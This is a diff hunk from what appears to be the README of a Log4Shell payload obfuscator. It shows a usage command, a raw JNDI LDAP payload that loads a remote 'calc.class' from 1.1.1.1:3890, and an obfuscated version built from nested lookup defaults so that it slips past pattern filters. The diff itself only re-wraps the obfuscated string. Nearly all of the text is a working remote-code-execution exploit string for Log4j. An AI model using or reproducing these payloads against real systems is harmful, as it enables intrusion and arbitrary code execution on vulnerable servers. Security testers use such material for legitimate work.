@@ -19,12 +19,13 @@
    Log4Shell.exe -obf "${jndi:ldap://1.1.1.1:3890/calc.class}"
    
    raw: ${jndi:ldap://1.1.1.1:3890/calc.class}
-   ${${lhnK:JFL3Nl:-j}n${Yx6-A3NuXSY1nI-g38C4MN-WAFx:-d}i:${2O:bO2I5l:-l}${yeZ6-mnrv6pb:gB49n:XrYMP:-d}${jVBMSs-iOFWslRG-XuNO
-   :dsCO:-a}${jYYNn:Twh80-IYXK:-p:/}${eOFbh:DW35u2:-/1.}${EkFw3Z-YsM9CIMV8:g2DHZ:-1}${Vez8Sb:Mwn:-}${yWH0V-FY9jJQZ2:TOSkrotU:
-   oq1i:-}${kZ:BoJpOxRH-yFI2POt-88w2:-.1}${xbswX-VstKzXnyNzi8:jeEQKB5WRH-Ob:-}${Uyhe0-aYuAh-MdR63to:GONgfM:-.}${eA:eCPgpV-NWF
-   7s:-}${mrLla-owJSvkD:n0cmdQ-V2cLx:-1:3}${CwG9:Hc:-}${xT:aiD7ho:xz:-8}90${NTSL-dSfw9NC:7OiGEp:gMQwko:-}/${TCpW:UhZI0IO8:9Jz
-   5MH:WyM:-c}${Mlv:AS8TOFMM-b9I2:FqvBY:-al}${mfGW:EY1Yd48:E0KhRGfp:5CBsuC:-c}${xDw1-ZyHav9K:jPHo18i:zibmI:-.}c${ye-kZjRa5g61
-   cm-Hn2yR7:-la}${Htg:cySA:-s}s}
+   ${${lhnK:JFL3Nl:-j}n${Yx6-A3NuXSY1nI-g38C4MN-WAFx:-d}i:${2O:bO2I5l:-l}${yeZ6-mnrv6pb:gB49n:XrYMP:-d}
+   ${jVBMSs-iOFWslRG-XuNO:dsCO:-a}${jYYNn:Twh80-IYXK:-p:/}${eOFbh:DW35u2:-/1.}${EkFw3Z-YsM9CIMV8:g2DHZ:
+   -1}${Vez8Sb:Mwn:-}${yWH0V-FY9jJQZ2:TOSkrotU:oq1i:-}${kZ:BoJpOxRH-yFI2POt-88w2:-.1}${xbswX-VstKzXnyNz
+   i8:jeEQKB5WRH-Ob:-}${Uyhe0-aYuAh-MdR63to:GONgfM:-.}${eA:eCPgpV-NWF7s:-}${mrLla-owJSvkD:n0cmdQ-V2cLx:
+   -1:3}${CwG9:Hc:-}${xT:aiD7ho:xz:-8}90${NTSL-dSfw9NC:7OiGEp:gMQwko:-}/${TCpW:UhZI0IO8:9Jz5MH:WyM:-c}$
+   {Mlv:AS8TOFMM-b9I2:FqvBY:-al}${mfGW:EY1Yd48:E0KhRGfp:5CBsuC:-c}${xDw1-ZyHav9K:jPHo18i:zibmI:-.}c${ye
+   -kZjRa5g61cm-Hn2yR7:-la}${Htg:cySA:-s}s}
    ```
    
 ## Check
